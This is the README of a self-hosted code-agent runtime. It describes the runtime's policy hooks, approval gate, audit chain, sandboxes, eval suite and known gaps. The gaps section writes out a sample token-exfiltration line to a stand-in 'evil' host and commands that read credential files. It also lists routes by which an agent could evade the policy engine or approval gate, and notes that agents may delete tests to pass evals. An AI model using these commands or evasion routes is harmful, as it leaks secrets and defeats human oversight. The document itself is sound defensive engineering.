# perimeter-agent

> 一个可完全私有部署的 code agent 运行时，代码与凭据永不出客户网络边界，浏览器只是零安装的操作面。

本仓库是 [`browser-code-agent-strategy.md`](./docs//browser-code-agent-strategy.md) 里工程部分的实现。浏览器 → 网关 → pi → **模型网关** → 上游是一条真实跑通的链路：网关为每个会话生成隔离的 pi HOME，`models.json` 指向模型网关、apiKey 是会话 token，上游凭据只存在于模型网关进程里。git 代理的接线（`insteadOf` 重写）也已接上 demo，会话启动时经代理 clone、审批通过后真的推到上游。各条铁律的现状见下表与「边界与已知缺口」。商业动作（客户访谈、融资、付费 POC）不在本仓库范围内。

底层 agent 用 [pi](https://github.com/badlogic/pi-mono)（MIT）的 RPC 模式，走策略文档 §5 的**路线 C**。

## 30 秒跑起来

前置：Node ≥ 22.18，以及**全局安装的 pi**（本仓库只用它的 RPC 模式，故意不作为 npm 依赖锁死版本）：

```bash
npm i -g @earendil-works/pi-coding-agent   # 实测版本 0.84.2
npm install && npm run demo
```

`pi` 必须在 PATH 上。demo 会先预检 —— 早期版本不预检时的失败形态是最难排查的那种：地址照常打印，客户点开链接才收到 `spawn pi ENOENT`。

打开终端里给出的地址，发一句「修复登录超时的 bug」，会看到三段：

1. 改源码 → 放行，右侧审计流实时出现 `policy.verdict allow`
2. 改 `.github/workflows/` → **被策略拒绝**，界面上出现红色条目，文件从未落盘
3. `git push` → **审批门拦下**，等人点批准或拒绝，超时按拒绝

演示用 mock 模型端点，**不需要任何 API key、不需要外网**。这既是钩子测试的前提，也是策略文档要求的「演示环境挂掉时的保险」。接真实模型：`PERIMETER_DEMO_REAL=1 npm run demo`，并按 pi 的常规方式配好 provider。

```bash
npm test          # 387 个测试
npm run typecheck
npm run gen:deploy  # 从 config/policy.yaml 重新生成 NetworkPolicy 与策略 ConfigMap
```

## 四条铁律与它们各自落在哪

| 铁律 | 落地位置 | 现状 |
|---|---|---|
| 代码永不离开 Data Plane | 审计只记 hash 不记源码（`src/audit/log.ts`） | ⚠️ 有一处有意例外：`command` 存原文，且 `summary` 含命令前 120 字符。SIEM 导出默认把两者都关掉（`src/audit/siem.ts`），`--command redacted` 只挡已知形态的凭据 |
| 凭据永不进沙箱 | git 凭据代理（`src/gitproxy/`）、模型网关（`src/modelgw/`）、pi 子进程 env 白名单 | ✅ 端到端验证：三种凭据分处三地，两组测试各自遍历沙箱全树：wiring 那组断言无模型 key 与网关 token，git-e2e 那组断言无上游 git token、且代理 token 不在 workspace 内（落进去就会被 agent 一句 git add -A 推到上游） |
| egress 双出口 + 默认拒绝 | `config/policy.yaml` 的 `egress.deny_all_except` → 生成 `deploy/networkpolicy.yaml` | ❌ **设计承诺，不是运行中的事实**。清单只做了生成与静态校验，没有任何代码去 apply 它 |
| 每次工具调用过策略且留痕 | pi 扩展注入 `tool_call` 钩子（`src/gateway/policy-extension.ts`） | ✅ 钩子级粒度，容器里同样生效。但**路径规则对 bash 不生效**，见「边界」 |

## 一个被验证的关键判断

策略文档 §7.2 把这条列为 P1·W5 的**第一件事**：路线 C 只能在网关层拦事件流，粒度是「中」，而 Phase 1 的验收标准要求「100% 工具调用有记录、0 例绕过审批门」。走不通就必须下调验收标准（R10）。

**结论：走得通。** pi 的扩展机制可以注册 `tool_call` 钩子，它在工具执行前触发且能 block；审批走 pi 现成的扩展 UI 子协议（`ctx.ui.select` → stdout → 网关 → 浏览器），不需要额外开端口。因此不必等 Phase 2 迁路线 A，现在就有钩子级粒度。

沿途实测到三件与文档不符、值得记下的事：

- **RPC 的 `bash` 直接命令不经过 `tool_call` 钩子**（它不是模型的工具调用）。网关因此不把它暴露给前端 —— 暴露了就等于开了一条绕过策略引擎的路。
- **pi 对未知事件名不报错、不发 `extension_error`**，钩子注册失败是静默的，工具照常执行。所以扩展会在会话开始时发一条 `hook-armed` 握手，网关在收到之前拒绝下发任何 prompt。这是「0 例绕过」唯一的运行时证据。
- **真实 pi 只发 `agent_end`**，文档里的 `agent_settled` 在这条路径上不出现。

## 目录

```
src/protocol/     自有事件协议 —— 前端永不见 pi 的格式（Phase 2 迁移的护城河）
src/rpc/          JSONL 成帧 + pi 子进程生命周期
src/policy/       策略引擎：deny / require_approval / allow
src/audit/        append-only 审计日志（哈希链）
src/gateway/      会话网关、审批门、策略扩展、执行后端（local/docker/kubectl）
src/modelgw/      模型网关：出口 allowlist、凭据隔离、计量配额
src/gitproxy/     git 凭据代理
src/deploy/       从策略文件生成 NetworkPolicy
src/evals/        golden task suite：任务规格、执行器、记分
web/              零构建操作面
config/policy.yaml  策略与 egress allowlist 的唯一事实来源
deploy/           K8s 清单
evals/            任务规格（tasks/）与仓库快照（repos/）
```

技术栈刻意保持最小：TypeScript 直接由 Node 运行（类型剥离，无构建步骤），运行时依赖白名单现增加精确锁定的 Pi Durable / pi-ai / chord / pi-env 1.1.0，用于可信网关内的持久运行时与远程工具环境；测试用 `node:test`。

## Golden task suite

策略文档把它列为 Phase 1 的验收依据：把「完成率 > 50%」从口号变成可测指标，
并当作以后每次改模型、改 prompt、改策略的回归基线。

```bash
node scripts/eval.ts --provider anthropic --model claude-opus-5
node scripts/eval.ts --task range-sum-off-by-one --approve   # 只跑一个，放开审批
```

**agent 那一段**跑的是完整的产品路径 —— 真实网关、真实策略引擎、真实审批门、
真实审计。绕开这些直接调 pi 的话，测出来的完成率就不是这个产品的完成率，
而基线的意义正在于「改了策略之后掉了多少」。

**验收那一段不是**：它走 `ExecutionBackend.exec`，不过策略引擎、不进审计、
不受 egress allowlist 约束。走后端换来的只有**隔离**（且仅 docker/kubectl 下
成立）。这个区分要说清楚，否则「完整产品路径」这句会被读成验收也在策略之下。

五个设计决定值得单独说，它们都不是形式上的选择：

- **审批默认自动拒绝**。评测是无人值守的，而审批门是产品的核心。全自动批准
  等于把它关掉，数字好看但不对应任何真实体验；自动拒绝则能回答一个更要紧的
  问题 —— 策略是不是紧到把正常工作也挡了。审批次数同时就是「人工干预次数」
  这个指标。`--approve` 打开批准模式，两个数字之差就是审批门的成本。
- **起点预检**。重构与依赖升级类任务的起点测试本来就是绿的，没有预检的话
  agent 什么都不做也算完成。每个任务必须声明 `failsAtStart`，加载时反向校验
  「起点确实不满足验收」，把恒真的任务挡在集合之外。预检必须在 agent 跑之前，
  跑之后就分不清「起点就绿」和「agent 修好了」。
- **验收命令走执行后端，不直接 spawn**。它们跑的是 agent 刚写进工作区的代码，
  走后端能让它落在沙箱里而不是网关的 OS 用户身份上。代价是 `exec` 成了一个
  「在沙箱里跑任意 shell、无策略、无留痕」的通用能力，挂在网关自己也持有的
  接口上 —— 今天只有验收步骤调它，再多一处调用方就要先想清楚是不是在给
  agent 开策略旁路。
- **预检跑在沙箱起来之后**。位置很讲究：docker/kubectl 下沙箱在会话启动时
  才创建，预检若跑在那之前，`docker exec <不存在的容器>` 会被归一成退出码 1，
  预检就把「容器还没起来」误读成「起点确实失败」而永远放行 —— 这道闸门恰好
  会在为生产准备的两个后端上失效。所以它卡在 `session.ready` 之后、
  发 prompt 之前这个窄窗口里。
- **不计入完成率的两种情况**：预检失败（任务集自身坏了）与 agent 从未启动
  （没配 API key、provider 名字打错）。把它们算成任务失败，一个打错的目录名
  或一台没配凭据的机器就会表现为「模型变差」。全部未计入时完成率报 `—` 而
  不是 `0%`。

**没有真实模型跑过基线数字。** 框架、判据、记分与全部闸门都有测试守着
（`tests/evals.test.ts`，15 条），但完成率这个数字需要真实模型凭据才跑得出来 ——
本仓库没有，也不该编一个。跑不出数字时 CLI 会如实报 `完成率 —（0/0）` 并以
非零退出。

其余边界：

- **只有 4 个种子任务**，R7 限定的四类各一个。策略文档要的是 20–30 个，
  且必须**与 POC 客户共建** —— 用别人的仓库定义出来的任务集，测不出客户
  关心的完成率。这四个的作用是把格式与闸门跑通。
- **重构类的结构判据是 proxy**。`04-slice-guard-dedupe.yaml` 数的是 throw 点
  有几处（最初数的是校验条件本身 `n < 0`，那更弱 —— 改个空格写成 `n<0` 就
  骗过去了）。数 RangeError 至少被测试锁着：三个函数的越界行为都有断言。
  但它仍是 proxy，重构的客观判据本来就弱，真正的把关是人看 diff —— 也就是
  策略文档里那个「diff 接受率」指标，报告里给不出它，也不假装给。
- **CLI 只支持 local 后端**，验收因此在本机跑，没有隔离。报告里的 `backend`
  字段会带上这句警告，让数字的可信度跟着数字走。docker / kubectl 形态要直接
  调 `runTask` 并传对应 backend（它们的 `execArgs` 有形状测试，但同样没在
  真实 daemon / 集群上跑过）。

三个坑值得记下来，它们都属于「验收恒真」这一类 —— 而恒真的 runner 比没有
runner 更糟，因为完成率是 Phase 1 的验收指标：

- **`node --test` 找不到任何测试文件时退出码是 0。** 于是「删掉 sum.test.js」
  就能拿到完成，而删测试正是 agent 面对失败测试最经典的走捷径方式。同理，
  `! grep -q ... links.js` 在文件不存在时 grep 退出 2，取反后反而成了通过 ——
  删掉源文件能一次骗过多条判据。现在每条 `node --test` 都配了一条
  `grep -qE '^ℹ pass [1-9]'` 数实际跑过的用例，涉及文件的判据都先 `test -f`。
  四个种子任务都实测过：删光仓库里的 `.js` 之后，没有一个还能全绿。
- **`NODE_TEST_CONTEXT` 污染。** `LocalBackend.exec` 原本继承 `process.env`，
  而 node 的 test runner 会给子进程注入这个变量，验收命令里的 `node --test`
  看到它就以为自己是被托管的子进程，退出码不再反映测试结果。任何在 test
  runner 里跑评测的场合都会撞上（`npm test` 也算），单独手跑 CLI 才看不见。
  现在 exec 只传白名单环境变量。**但别把白名单当安全边界**：`HOME` 就在白名单里，
  而凭据大多住在 `$HOME` 下；local 后端里验收命令以网关的 OS 用户身份无隔离
  运行，`cat ~/.aws/credentials` 一句话的事。环境变量挡得住，磁盘挡不住。
- **关掉 WebSocket 不等于 agent 停了。** 网关那侧的 close 只把这条传输从广播
  集合里摘掉，任务照常在服务端跑（那正是「关浏览器不受影响」这个产品特性的
  实现）。超时任务的验收因此会读到 agent 写到一半的文件，同一份代码跑两次
  结果不同 —— 而回归基线的全部价值就是可重复。现在验收之前先发 `abort` 并
  等 agent 真的收尾，等不到就在报告里留痕。

## 交接

[docs/handoff.md](docs/handoff.md) —— 给下一个接手的人：读代码的顺序、
五个从代码里看不出来的设计判断、十条会静默失败的坑、以及「什么验过 /
什么没验 / 各自缺什么」的状态清单。

## Review 记录

每个功能的流程是「实现 → subagent review → 修复 → commit」。覆盖情况、
一处流程偏差（F13 未 review 即提交）、以及 review 反复抓到的三种问题模式，
都记在 [docs/review-log.md](docs/review-log.md)。

## 边界与已知缺口

这一节是给自己和客户安全团队看的，**销售材料里不要越过它**。

**沙箱：容器后端已实现并验证，K8s 后端未验证：**

`src/gateway/execution-backend.ts` 把「pi 进程在哪儿跑」抽象成三种后端：

| 后端 | 隔离 | 状态 |
|---|---|---|
| `local` | **无** —— agent 与网关同一个 OS 用户 | 默认，开发与 demo 用，**不是生产形态** |
| `docker` | 只读根、非 root、drop ALL caps、no-new-privileges、内存/PID 上限、独占工作区 | ✅ 本机实测（macOS/OrbStack，见下） |
| `kubectl` | 由 `deploy/sandbox.yaml` 的 Pod 定义决定 | ⚠️ 命令行形状 + 清单已过官方 schema 离线校验；**未在真实集群跑过**，镜像必须含 `tar` |

docker 后端的实测结论（`tests/docker-backend.test.ts`，无 docker 时整组跳过并说明原因）：

- 容器里看不到宿主机文件系统（`/Users` 不存在），工作区正常挂入，uid 10001 非 root
- 根文件系统只读，只有 `/tmp` 与工作区可写
- 挂进去的策略扩展与策略文件是**只读**的 —— agent 改不了自己的策略
- `--network none` 下确实无法出网，证明 egress 阻断机制有效
- **端到端：整个会话跑在容器里，策略钩子照常拦下写 CI 配置的操作**

两点必须说清楚，否则会被误读：

- **egress 在 docker 后端下默认是通的**。后端默认用 `bridge` 网络，容器能出公网。要落地「egress 默认 deny」得用 `docker network create --internal` 并把两个代理放进去，或者在 K8s 侧靠 NetworkPolicy。四条铁律里这一条在 docker 后端下**不成立**。
- **只在 macOS 验证过**。Linux 的 bind mount 保留宿主机属主，因此容器身份默认取网关自己的 uid 而不是镜像里的 10001（`DockerBackendOptions.user` 可覆盖）；macOS 的 Docker Desktop / OrbStack 做属主重映射，这条差异在本机测不出来。

**Pod 的创建与回收现在有代码了**（`src/deploy/pod-template.ts` + `KubectlBackend.provision/cleanup/reapOrphans`）：从 `deploy/sandbox.yaml` 渲染每会话 Pod、create、等 Ready、cp 配置进去，会话结束删 Pod，网关重启时按 label 回收孤儿。

**整条 kubectl 路径未在真实集群跑过。** 离线能证的已经证了：渲染产物通过 Kubernetes v1.31.0 官方 JSON schema 校验（字段名与类型层面）、Pod 与 NetworkPolicy 的 label/namespace 一致、sessionId 规范化后满足 DNS-1123 与 label 的长度约束。
但 schema 有明确盲区——枚举值写错、名字非法、`containers: []` 它都放行；准入控制器、配额、runtimeClass 是否存在、镜像能否拉取更在覆盖之外。部署时 `deploy/` 下的三份清单都要 apply：`policy-configmap.yaml`（策略，由 `npm run gen:policy-cm` 从 `config/policy.yaml` 生成）、`networkpolicy.yaml`（egress，由 `npm run gen:netpol` 生成）、以及每会话的 Pod（由网关在运行时渲染）。前两份是生成物，改策略后要重新生成——有测试守着漂移。所以「每会话独占沙箱」在 docker 后端下是运行中的事实，在 K8s 形态下仍然只是「代码写了、没验过」。另外镜像必须含 `tar`（`kubectl cp` 走 exec+tar），客户自带的 distroless 镜像会让整条路径断掉。

**接线：模型网关与 git 代理都已接上 demo：**

网关会为每个会话生成沙箱侧配置（`src/gateway/sandbox-config.ts`）：`models.json` 的 baseUrl 指向模型网关、apiKey 写会话 token；git 的 `insteadOf` 规则把上游 SCM 重写到 git 代理并关掉本地 credential helper。

- **模型网关**：已在 demo 与端到端测试里跑通。测试遍历沙箱能看到的全部文件，断言其中既无上游凭据、也无网关 token，只有代理 token；请求确实经过模型网关（有计量记录）。**三个 token 刻意取不同的值** —— 代理 token 若等于网关 token，agent 读到 models.json 就能连回网关批准自己挂起的审批，网关构造时会拒绝这种配置。
- **git 代理**：已接上。demo 会起一个真实的上游 git 仓库 + smart HTTP 服务 + 凭据代理，会话启动时网关经代理 clone（审计里有冷启动打点，本机实测 ~120ms）。审批通过后推送真的到达上游仓库，可以当场 `git log` 验证。

**Week 3 验收标准已兑现**（`tests/git-e2e.test.ts`）：真实 git 客户端经凭据代理完成 clone 与 push，改动确实进入上游裸仓库；沙箱侧只有代理 token，上游 git 凭据不在其中；只读仓库的 push 被拒且不到达上游；allowlist 之外的仓库 clone 直接失败。


**明确没做：**

- **四条模型通道都没对真实上游验证过**。Azure OpenAI（api-key 头）、自托管 vLLM（Bearer）、AWS Bedrock（SigV4 签名）、Google Vertex（service account 换 access token）的认证都实现了，SigV4 比对了 AWS 官方测试向量，但**没有一条打到过真的上游**。
  另外「支持 Bedrock/Vertex」的准确含义是「能用它们的认证方式打到它们的 **OpenAI 兼容端点**」——网关不做协议转换，也不接受原生格式的入站请求。销售材料按这个口径写。

  离线能证的已经证了：SigV4 与 `aws4`（aws-sdk-js v2 的签名器）在 64 个组合上逐字符交叉验证（16 种路径形态 × 4 种头集合，含生产实际使用的 content-sha 与 IRSA 临时凭据）；Vertex 的 JWT 断言用配对公钥做了 RS256 密码学验签，并断言有效期不超过 Google 的上限。
  这些证明的是「签名与断言的构造正确」，**仍不等于上游会接受** —— region/service 选择、端点路径、时钟偏差、配额都在覆盖之外。
- **身份**。Phase 1 只有共享 token，作用是把演示环境关起来。OIDC/SAML + RBAC 是 Phase 2。且浏览器的 WebSocket 无法自定义 header，token 走 URL query，**会进反向代理与服务器访问日志**
- 沙箱编排、Helm chart、多 SCM、monorepo 支持

**能力边界（不是缺口，是设计上的取舍）：**

- **路径 deny 规则只对带 `path` 参数的工具（write/edit 等）生效。** bash 按命令模式匹配，`echo x > .github/workflows/ci.yml` 在本引擎眼里没有路径。也就是说 `config/policy.yaml` 里那份 deny_paths 清单（CI、IaC、`.pi/**`、`AGENTS.md`、`.git/config`）**对 bash 写文件不成立**，只能靠命令黑名单兜 —— 而黑名单如下一条所述不是安全边界。要让路径规则真正统一，需要 Phase 2 在 FS 层（RemoteExecutionEnv）收口。`tests/redteam.test.ts` 里有一条测试专门断言这个局限。
- **只读工具豁免路径规则**，因此 `read .env` / `read ~/.aws/credentials` 是放行的，内容会进模型上下文。这是为避免审批疲劳的有意取舍（每次读 `package.json` 都要人批，几轮后操作员就会无脑点同意），缓解手段是模型网关的凭据检测，它现已在链路上，但只告警不阻断。
- **命令黑名单是启发式，不是安全边界。** shell 的求值方式（变量展开、base64、别名、间接调用）注定它可被绕过。真边界是 egress 默认 deny + 凭据不进沙箱 + 每会话独占沙箱 —— 后两条在 docker 后端下已成立，egress 那条仍取决于部署（见上）。`tests/redteam.test.ts` 里有一条测试**刻意断言黑名单拦不住**。
- **egress allowlist 即便部署了，也只杀掉「直连任意外部主机」这一类外泄。** 生成的策略必须放通 DNS（否则内部主机名都解析不了），DNS 隧道仍然可行；经模型网关的请求体本身也是一条合法外泄通道（凭据检测是 audit-only，不阻断不改写）。
- **哈希链防的是意外损坏与粗糙篡改，不防有文件写权限的攻击者** —— 那种攻击者能从头重算整条链，也能截断尾部。要升级为防恶意篡改需要外部锚点（链头是纯元数据，可以出 Data Plane），`AuditLog.verify(path, expectedHead)` 已留入口，上报由部署侧接。安全白皮书里必须同口径表述，不要写成「防篡改」。
- **前端渲染的全部内容都是 agent 可控的**（模型输出、工具结果、命令原文）。一律走 `textContent`，不用 `innerHTML`/`eval`，CSP 限同源且 `connect-src` 不含 `ws:`/`wss:` 这类 scheme-source —— 后者匹配任意主机，注入的脚本一句 `new WebSocket("wss://evil/?t="+location.search)` 就能把 URL 里的 token 送走。这些性质由 `tests/web-injection.test.ts` 锁住（`web/` 是零构建原生 JS，类型系统与 lint 都够不着）。
- **PII/secret 检测只做 audit-only**（检测 + 告警，不改写流）。对代码流做正则/熵改写误伤率高，会直接破坏生成质量；阻断模式要等有真实误报数据再上。

## Phase 2 迁移成本

整个 roadmap 里最重要的一条工程纪律：**前端永远不直接消费 pi 的事件格式**。

**零改动的部分**（已核实无任何 pi 引用）：`src/protocol/types.ts`、`web/`、`src/policy/`、`src/audit/`、`src/modelgw/`、`src/gitproxy/`。前端与协议定义是这条纪律的主要受益者。

**需要重写的部分**：

| 位置 | 涉及的 pi 知识 |
|---|---|
| `src/protocol/translate.ts` | 全部事件与命令的格式转换，这是设计上的唯一转换点 |
| `src/rpc/` | JSONL 成帧与子进程生命周期，路线 A 下整个消失 |
| `src/gateway/policy-extension.ts` | pi 的扩展 API 与扩展 UI 子协议，改为直接注册 `beforeToolCall` |
| `src/gateway/session.ts` | **仍直接消费三个 pi 事件类型名**：`extension_ui_request`（审批通道）、`tool_execution_start` / `tool_execution_end`（兜底审计）。这三处是纪律上的例外，Phase 2 要一并处理 |

session.ts 那三处是有意识的取舍而非疏漏：审批通道与兜底审计都需要在 translate 之外做副作用（写审计、发审批），硬塞进纯转换函数会让 translate.ts 变成一个有状态的上帝对象。但它们确实构成迁移成本，不该在文档里被说成零。

## 用容器后端跑

```bash
docker build -t perimeter-sandbox:test -f deploy/sandbox.Dockerfile .
npm test   # 容器组会自动跑；没有 docker 时整组跳过并说明原因
```

网关侧接上后端：

```ts
new Gateway({
  …,
  backend: new DockerBackend({
    image: "perimeter-sandbox:test",
    repoRoot: process.cwd(),
    // 生产上应当用 internal 网络并把两个代理也放进去 ——
    // internal 网络禁止出公网，这才是 egress 默认 deny 的落地形态
    network: "perimeter-internal",
  }),
});
```

策略扩展跑在 pi 进程内，因此容器必须能看到它：后端会把 `src/`、`config/`、`node_modules/` 三个子树**只读**挂进 `/opt/perimeter`。刻意不整仓挂载——`audit-data/` 与 `workspaces/` 都在仓库里，挂进去等于让 agent 读到审计日志和别的会话的工作区。
